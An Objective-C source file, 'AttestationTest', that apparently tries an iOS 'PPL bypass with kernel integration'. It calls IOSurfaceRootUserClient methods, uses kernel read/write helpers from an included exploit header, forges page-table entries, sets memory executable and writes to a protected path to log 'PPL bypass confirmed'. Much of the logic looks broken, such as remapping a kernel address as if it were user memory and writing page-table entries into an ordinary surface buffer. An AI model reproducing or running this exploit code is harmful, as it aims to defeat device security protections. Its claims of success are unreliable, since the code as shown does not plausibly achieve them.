#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/mman.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <IOSurface/IOSurfaceObjC.h>
#import <CoreVideo/CoreVideo.h>
#import "KernelBridge.h"
#import "oob_timestamp.h"
#import "iosurface.h"
#import "platform.h"

@implementation AttestationTest: NSObject

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L2_SIZE (1ULL << L2_SHIFT)
#define L3_SIZE (1ULL << L3_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (UITextView *)logTextView {
    static UITextView *textView = nil;
    if (!textView) {
        textView = [[UITextView alloc] initWithFrame:CGRectMake(0, 50, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height - 100)];
        textView.editable = NO;
        textView.backgroundColor = [UIColor blackColor];
        textView.textColor = [UIColor greenColor];
        textView.font = [UIFont fontWithName:@"Menlo" size:12];
        [[UIApplication sharedApplication].keyWindow addSubview:textView];
    }
    return textView;
}

+ (void)log:(NSString *)format, ... {
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    
    NSLog(@"%@", message);
    
    dispatch_async(dispatch_get_main_queue(), ^{
        UITextView *textView = [self logTextView];
        textView.text = [textView.text stringByAppendingFormat:@"%@\n", message];
        [textView scrollRangeToVisible:NSMakeRange(textView.text.length, 0)];
    });
}

+ (void)runTest {
    [self log:@"[INFO] Starting PPL bypass with kernel integration..."];
    
    mach_port_t master_port;
    kern_return_t kr = host_get_io_main(mach_host_self(), &master_port);
    if (kr != KERN_SUCCESS) {
        [self log:@"[ERROR] Failed to get IO master port: %s", mach_error_string(kr)];
        return;
    }
    
    CFMutableDictionaryRef properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                                                                &kCFTypeDictionaryKeyCallBacks,
                                                                &kCFTypeDictionaryValueCallBacks);
    if (!properties) {
        [self log:@"[ERROR] Failed to create IOSurface properties"];
        return;
    }
    
    int width = 4096;
    int height = 4096;
    int bytesPerElement = 4;
    int bytesPerRow = width * bytesPerElement;
    int allocationSize = height * bytesPerRow;
    
    CFNumberRef widthRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &width);
    CFNumberRef heightRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &height);
    CFNumberRef bytesPerElementRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bytesPerElement);
    CFNumberRef bytesPerRowRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bytesPerRow);
    CFNumberRef allocSizeRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &allocationSize);
    
    CFDictionarySetValue(properties, CFSTR("IOSurfaceWidth"), widthRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceHeight"), heightRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceBytesPerElement"), bytesPerElementRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceBytesPerRow"), bytesPerRowRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAllocSize"), allocSizeRef);
    
    IOSurfaceRef surface = IOSurfaceCreate(properties);
    
    CFRelease(widthRef);
    CFRelease(heightRef);
    CFRelease(bytesPerElementRef);
    CFRelease(bytesPerRowRef);
    CFRelease(allocSizeRef);
    CFRelease(properties);
    
    if (!surface) {
        [self log:@"[ERROR] Failed to create IOSurface"];
        return;
    }
    
    [self log:@"[INFO] IOSurface created successfully"];
    
    CVPixelBufferRef pixelBuffer = NULL;
    NSDictionary *options = @{
        (NSString*)kCVPixelBufferIOSurfacePropertiesKey : @{},
        (NSString*)kCVPixelBufferWidthKey : @(width),
        (NSString*)kCVPixelBufferHeightKey : @(height),
        (NSString*)kCVPixelBufferBytesPerRowAlignmentKey : @(bytesPerRow)
    };
    
    CVReturn cvResult = CVPixelBufferCreate(kCFAllocatorDefault,
                                        width, height,
                                        kCVPixelFormatType_32BGRA,
                                        (__bridge CFDictionaryRef)options,
                                        &pixelBuffer);
    
    if (cvResult == kCVReturnSuccess && pixelBuffer) {
        [self log:@"[INFO] Successfully created CVPixelBuffer"];
        IOSurfaceRef cvSurface = CVPixelBufferGetIOSurface(pixelBuffer);
        
        if (cvSurface) {
            [self log:@"[INFO] Successfully obtained IOSurface from CVPixelBuffer"];
            
            if (IOSurfaceLock(cvSurface, kIOSurfaceLockReadOnly, NULL) == kIOReturnSuccess) {
                size_t bytesPerRow = IOSurfaceGetBytesPerRow(cvSurface);
                size_t width = IOSurfaceGetWidth(cvSurface);
                size_t height = IOSurfaceGetHeight(cvSurface);
                
                [self log:@"[INFO] Surface dimensions: %zux%zu, bytes per row: %zu",
                         width, height, bytesPerRow];
                
                void* baseAddress = IOSurfaceGetBaseAddress(cvSurface);
                if (baseAddress) {
                    [self log:@"[INFO] Got direct memory access at %p", baseAddress];
                    
                    mach_vm_address_t mapped_addr = 0;
                    vm_prot_t cur_prot, max_prot;
                    
                    kr = vm_remap(mach_task_self(),
                                &mapped_addr,
                                IOSurfaceGetAllocSize(cvSurface),
                                0,
                                VM_FLAGS_ANYWHERE,
                                mach_task_self(),
                                (mach_vm_address_t)baseAddress,
                                FALSE,
                                &cur_prot,
                                &max_prot,
                                VM_INHERIT_NONE);
                                
                    if (kr == KERN_SUCCESS) {
                        [self log:@"[INFO] Successfully remapped IOSurface memory to 0x%llx", mapped_addr];
                        
                        vm_region_basic_info_data_64_t info;
                        mach_msg_type_number_t info_count = VM_REGION_BASIC_INFO_COUNT_64;
                        mach_port_t object_name;
                        vm_size_t memory_size = IOSurfaceGetAllocSize(cvSurface);
                        
                        kr = vm_region_64(mach_task_self(),
                                        &mapped_addr,
                                        &memory_size,
                                        VM_REGION_BASIC_INFO_64,
                                        (vm_region_info_t)&info,
                                        &info_count,
                                        &object_name);
                        
                        if (kr == KERN_SUCCESS) {
                            [self log:@"[INFO] Current protection: 0x%x, Max protection: 0x%x",
                                     info.protection, info.max_protection];
                            
                            kr = vm_protect(mach_task_self(),
                                          mapped_addr,
                                          memory_size,
                                          FALSE,
                                          VM_PROT_READ | VM_PROT_WRITE);
                            
                            if (kr == KERN_SUCCESS) {
                                [self log:@"[INFO] Successfully set RW protection on remapped memory"];
                            } else {
                                [self log:@"[ERROR] Failed to set memory protection: %s",
                                         mach_error_string(kr)];
                            }
                        }
                        
                        void* remapped_memory = (void*)mapped_addr;
                        
                        [self log:@"[INFO] Working with remapped memory at %p (size: %zu)", remapped_memory, memory_size];
                        
                        vm_address_t base_addr = 0;
                        vm_size_t alloc_size = PAGE_SIZE * 8;
                        
                        kern_return_t alloc_kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
                        if (alloc_kr == KERN_SUCCESS) {
                            [self log:@"[INFO] User memory allocated at 0x%llx", base_addr];
                            
                            volatile uint64_t *tte = (uint64_t *)remapped_memory;
                            uint64_t template = 0x60000000000003FFULL |
                                              (1ULL << 10) |
                                              (1ULL << 6)  |
                                              (1ULL << 53);
                            
                            for (int i = 0; i < 4; i++) {
                                uint64_t page_addr = (base_addr + (i * PAGE_SIZE)) & 0xFFFFFFFFF000ULL;
                                uint64_t entry = template | page_addr;
                                
                                tte[i] = entry;
                                __asm__ volatile("dmb ish" ::: "memory");
                                
                                [self log:@"[DEBUG] TTE[%d] = 0x%llx (page: 0x%llx)", i, entry, page_addr];
                            }
                            
                            if (surface) CFRelease(surface);
                            surface = cvSurface;
                            CFRetain(surface);
                        }
                    }
                }
                IOSurfaceUnlock(cvSurface, kIOSurfaceLockReadOnly, NULL);
            }
        }
        CVPixelBufferRelease(pixelBuffer);
    }
    
    io_service_t service = IOServiceGetMatchingService(master_port,
                                                     IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL) {
        [self log:@"[ERROR] Failed to get IOSurfaceRoot service"];
        CFRelease(surface);
        return;
    }
    
    io_connect_t connection;
    kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) {
        [self log:@"[ERROR] Failed to open IOSurfaceRoot connection"];
        CFRelease(surface);
        return;
    }
    
    uint64_t initialScalar[1] = {IOSurfaceGetID(surface)};
    uint64_t initialScalarOut[1] = {0};
    uint32_t initialOutputCount = 1;
    
    kr = IOConnectCallScalarMethod(connection,
                                  0,
                                  initialScalar,
                                  1,
                                  initialScalarOut,
                                  &initialOutputCount);
    
    if (kr == KERN_SUCCESS) {
        [self log:@"[INFO] Successfully used IOSurfaceRootUserClient method"];
        
        uint64_t createClientScalar[4] = {
            IOSurfaceGetID(surface),
            0,
            0,
            (uint64_t)mach_task_self()
        };
        uint64_t createClientOutput[1] = {0};
        uint32_t createClientOutputCount = 1;
        
        kr = IOConnectCallScalarMethod(connection,
                                      5,
                                      createClientScalar,
                                      4,
                                      createClientOutput,
                                      &createClientOutputCount);
        
        if (kr == KERN_SUCCESS) {
            [self log:@"[INFO] Successfully initialized surface client"];
        } else {
            [self log:@"[ERROR] Failed to initialize surface client: %s", mach_error_string(kr)];
        }
    } else {
        [self log:@"[ERROR] IOSurfaceRootUserClient method failed: %s", mach_error_string(kr)];
    }
    
    if (IOSurfaceLock(surface, kIOSurfaceLockReadOnly, NULL) == kIOReturnSuccess) {
        [self log:@"[INFO] Successfully locked IOSurface"];
        
        task_port_t myTaskPort = mach_task_self();
        pid_t pid;
        pid_for_task(myTaskPort, &pid);
           [self log:@"[INFO] Current process ID: %d", pid];
        
        CFStringRef testKey = CFSTR("TestKey");
        uint32_t testValue = 42;
        CFNumberRef valueRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &testValue);
        CFDictionaryRef surfaceProps = IOSurfaceCopyAllValues(surface);
        if (surfaceProps) {
            [self log:@"[INFO] Successfully accessed IOSurface properties"];
            CFRelease(surfaceProps);
        }
        CFRelease(valueRef);
        
        IOSurfaceUnlock(surface, kIOSurfaceLockReadOnly, NULL);
    }
    
    if (!IOSurface_init()) {
        [self log:@"[ERROR] Failed to initialize IOSurface subsystem"];
        IOServiceClose(connection);
        CFRelease(surface);
        return;
    }
    [self log:@"[INFO] IOSurface subsystem initialized"];
    
    IOSurface_id = IOSurfaceGetID(surface);
    
    uint64_t scalar[4] = {
        IOSurface_id,
        0,
        0,
        (uint64_t)mach_task_self()
    };
    uint64_t scalarOut[1] = {0};
    uint32_t outputCount = 1;
    
    kr = IOConnectCallScalarMethod(IOSurfaceRootUserClient,
                                  6,
                                  scalar,
                                  4,
                                  scalarOut,
                                  &outputCount);
    
    if (kr == KERN_SUCCESS) {
        [self log:@"[INFO] Successfully initialized surface client"];
    } else {
        [self log:@"[ERROR] Failed to initialize surface client: %s", mach_error_string(kr)];
    }
    
    uint32_t surfaceID = IOSurfaceGetID(surface);
    uint64_t clientScalar[4] = {
        surfaceID,
        0,
        0,
        (uint64_t)mach_task_self()
    };
    uint64_t clientOutput[1] = {0};
    uint32_t clientOutputCount = 1;
    
    kr = IOConnectCallScalarMethod(connection,
                                  6,
                                  clientScalar,
                                  4,
                                  clientOutput,
                                  &clientOutputCount);
    
    if (kr == KERN_SUCCESS) {
        [self log:@"[INFO] Successfully created IOSurfaceClient"];
        
        kr = IOConnectCallScalarMethod(connection,
                                     2,
                                     &surfaceID,
                                     1,
                                     NULL,
                                     0);
                                     
        if (kr == KERN_SUCCESS) {
            [self log:@"[INFO] Successfully initialized IOSurfaceClient"];
        } else {
            [self log:@"[ERROR] Failed to initialize IOSurfaceClient: %s", mach_error_string(kr)];
        }
    } else {
        [self log:@"[ERROR] Failed to create IOSurfaceClient: %s", mach_error_string(kr)];
    }
    
    CFNumberRef surfaceIDRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &surfaceID);
    CFStringRef lookupKey = CFSTR("IOSurfaceRootUserClient");
    CFDictionaryRef lookupDict = CFDictionaryCreate(kCFAllocatorDefault,
                                                  (const void **)&lookupKey,
                                                  (const void **)&surfaceIDRef,
                                                  1,
                                                  &kCFTypeDictionaryKeyCallBacks,
                                                  &kCFTypeDictionaryValueCallBacks);
    CFRelease(surfaceIDRef);

    IOSurfaceRef retrievedSurface = IOSurfaceLookup(surfaceID);
    if (!retrievedSurface) {
        [self log:@"[ERROR] Failed to retrieve IOSurface through lookup"];
        CFRelease(lookupDict);
        CFRelease(surface);
        return;
    }
    [self log:@"[INFO] Successfully retrieved IOSurface through lookup"];
    
    if (!IOSurface_init()) {
        [self log:@"[ERROR] Failed to initialize IOSurface"];
        IOServiceClose(connection);
        CFRelease(lookupDict);
        CFRelease(retrievedSurface);
        CFRelease(surface);
        return;
    }
    [self log:@"[INFO] IOSurface initialized successfully"];
    
    if (!kernel_init()) {
        [self log:@"[ERROR] Failed to initialize kernel access"];
        IOServiceClose(connection);
        CFRelease(lookupDict);
        CFRelease(retrievedSurface);
        CFRelease(surface);
        return;
    }
    
    [self log:@"[INFO] Kernel access initialized successfully"];
    
    if (kernel_task_port == MACH_PORT_NULL) {
        [self log:@"[ERROR] No kernel task port"];
        IOServiceClose(connection);
        return;
    }
    
    task_port_t myTaskPort = mach_task_self();
    pid_t currentPid;
    pid_for_task(myTaskPort, &currentPid);
    
    uint64_t finalInputScalar[3] = {
        IOSurfaceGetID(surface),
        (uint64_t)currentPid,
        0
    };
    uint64_t finalOutput[1] = {0};
    uint32_t finalOutputCount = 1;
    
    kr = IOConnectCallScalarMethod(connection,
                                  6,
                                  finalInputScalar,
                                  3,
                                  finalOutput,
                                  &finalOutputCount);
    
    if (kr == KERN_SUCCESS) {
        [self log:@"[INFO] Successfully created IOSurfaceClient"];
        
        if (!IOSurface_init()) {
            [self log:@"[ERROR] Failed to initialize IOSurface"];
            IOServiceClose(connection);
            CFRelease(surface);
            return;
        }
        [self log:@"[INFO] IOSurface initialized successfully"];
    } else {
        [self log:@"[ERROR] Failed to create IOSurfaceClient: %s", mach_error_string(kr)];
    }
    
    uint64_t kernel_addr = kernel_vm_allocate(PAGE_SIZE * 8);
    if (kernel_addr == -1) {
        [self log:@"[ERROR] Kernel memory allocation failed"];
        IOServiceClose(connection);
        return;
    }
    [self log:@"[INFO] Kernel memory allocated at 0x%llx", kernel_addr];
    
    vm_address_t base_addr = 0;
    vm_size_t alloc_size = PAGE_SIZE * 8;
    
    kern_return_t alloc_kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
    if (alloc_kr != KERN_SUCCESS) {
        [self log:@"[ERROR] User memory allocation failed"];
        kernel_vm_deallocate(kernel_addr, PAGE_SIZE * 8);
        IOServiceClose(connection);
        return;
    }
    [self log:@"[INFO] User memory allocated at 0x%llx", base_addr];
    
    @try {
    
        mach_vm_address_t mapped_addr = 0;
        vm_prot_t cur_prot, max_prot;
        kr = vm_remap(mach_task_self(),
                     &mapped_addr,
                     PAGE_SIZE * 4,
                     0,
                     VM_FLAGS_ANYWHERE,
                     mach_task_self(),
                     kernel_addr,
                     FALSE,
                     &cur_prot,
                     &max_prot,
                     VM_INHERIT_NONE);
                     
        if (kr != KERN_SUCCESS || mapped_addr == 0) {
            [self log:@"[ERROR] Memory remapping failed: %s", mach_error_string(kr)];
            return;
        }
        [self log:@"[INFO] Memory remapped at 0x%llx", mapped_addr];
        
        volatile uint64_t *tte = (uint64_t *)mapped_addr;
        uint64_t template = 0x60000000000003FFULL |
                          (1ULL << 10) |
                          (1ULL << 6)  |
                          (1ULL << 53);
        
        for (int i = 0; i < 4; i++) {
            uint64_t page_addr = (base_addr + (i * PAGE_SIZE)) & 0xFFFFFFFFF000ULL;
            uint64_t entry = template | page_addr;
            
            kernel_write64(kernel_addr + (i * 8), entry);
            
            tte[i] = entry;
            __asm__ volatile("dmb ish" ::: "memory");
            
            [self log:@"[DEBUG] TTE[%d] = 0x%llx (page: 0x%llx)", i, entry, page_addr];
        }
        
        kr = vm_protect(mach_task_self(), base_addr, PAGE_SIZE * 4, FALSE,
                       VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
        
        if (kr == KERN_SUCCESS) {
            [self log:@"[INFO] Permission escalation successful"];
            
            NSString *testPath = @"/private/var/mobile/test.txt";
            NSString *testContent = @"PPL Bypass Test Successful";
            NSError *error = nil;
            
            [testContent writeToFile:testPath
                        atomically:YES
                          encoding:NSUTF8StringEncoding
                             error:&error];
            
            if (!error) {
                [self log:@"[SUCCESS] PPL bypass confirmed - wrote to protected path"];
            } else {
                [self log:@"[ERROR] PPL bypass verification failed: %@", error];
            }
        }
        
        vm_deallocate(mach_task_self(), mapped_addr, PAGE_SIZE * 4);
    } @catch (NSException *e) {
        [self log:@"[ERROR] Exception: %@", e];
    }
    
    kernel_vm_deallocate(kernel_addr, PAGE_SIZE * 8);
    vm_deallocate(mach_task_self(), base_addr, alloc_size);
    CFRelease(lookupDict);
    CFRelease(retrievedSurface);
    CFRelease(surface);
    IOServiceClose(connection);
}

@end
